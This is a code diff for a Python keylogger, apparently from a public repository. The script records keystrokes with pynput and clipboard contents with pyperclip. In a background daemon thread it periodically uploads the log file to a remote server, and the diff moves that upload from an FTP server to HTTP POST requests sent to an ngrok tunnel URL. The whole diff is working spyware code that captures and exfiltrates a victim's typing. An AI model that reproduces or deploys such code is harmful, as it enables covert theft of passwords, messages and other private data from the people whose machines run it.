@@ -4,22 +4,20 @@
 # import modules
 from tempfile import gettempdir
 from os import system,name
-from os.path import isfile
+from os.path import isfile,exists
 import threading
 from pynput import keyboard
 from pyperclip import paste   # for getting the clipboard data (supports cross platform)  
 from datetime import datetime
-from ftplib import FTP   # for sending the data to the ftp server
 from time import sleep
+from requests import post
 
 
 # <-- Initializing global values -->
 
 # change this
-SERVER_ADDRESS = ("192.168.29.54", 2121)        # replace the IP with your server's IP 
-INTERVAL = 10                                   # set interval according to your requirement
-USER = ''                                       # FTP Username
-PASSWD = ''                                     # FTP Password
+SERVER_ADDRESS = 'https://bcd4-103-55-96-137.ngrok-free.app/upload'         # replace the Address
+INTERVAL = 10                                                               # set interval according to your requirement
 
 
 
@@ -79,29 +77,35 @@ class keylogger:
         pass
 
 
-# send the file to the ftp server at regular interval
-class ftpuploader:
+# send the file to the http server at regular interval
+class uploader:
     
     # init
     def __init__(self):
-        self.ftp = FTP()
-        self.ftp.connect(SERVER_ADDRESS[0], SERVER_ADDRESS[1])  # Connect to the FTP server   
-        self.ftp.login(user=USER, passwd=PASSWD)
+        pass
     
     def upload_file_periodically(self):
+        
+        sleep(INTERVAL)
+        
         while True:
-            sleep(INTERVAL)
-            
             try:
-                with open(FILENAME, 'rb') as fh:
-                    self.ftp.storbinary(f'STOR {FILENAME}', fh)   # sending the file to the ftp server
-            
-            except Exception as e:
+                if exists(FILENAME):
+                    with open(FILENAME, 'rb') as fh:
+                        files = {'file': fh}
+
+                        post(SERVER_ADDRESS, files=files)   # sending the file
+
+                else:
+                    pass  # file not created/found
+
+                sleep(INTERVAL)
+
+            except:
                 pass
 
-    # ftp close
     def __del__(self):
-        self.ftp.quit()
+        pass
 
 
 
@@ -110,7 +114,7 @@ if __name__=='__main__':
     try:
         # creating objects
         keylogger  = keylogger()
-        ftp_uploader = ftpuploader()
+        uploader = uploader()
 
         # <---  implementing threading  ---> 
        
@@ -120,13 +124,12 @@ if __name__=='__main__':
 
 
         # sending file periodically and daemon = True (to run it in the background)
-        ftp_uploader_thread = threading.Thread(target = ftp_uploader.upload_file_periodically, daemon = True)
-        ftp_uploader_thread.start()
+        uploader_thread = threading.Thread(target = uploader.upload_file_periodically, daemon = True)
+        uploader_thread.start()
 
 
         keylogger_thread.join()
-        ftp_uploader_thread.join()   
+        uploader_thread.join()   
     
     except KeyboardInterrupt:
         pass
-
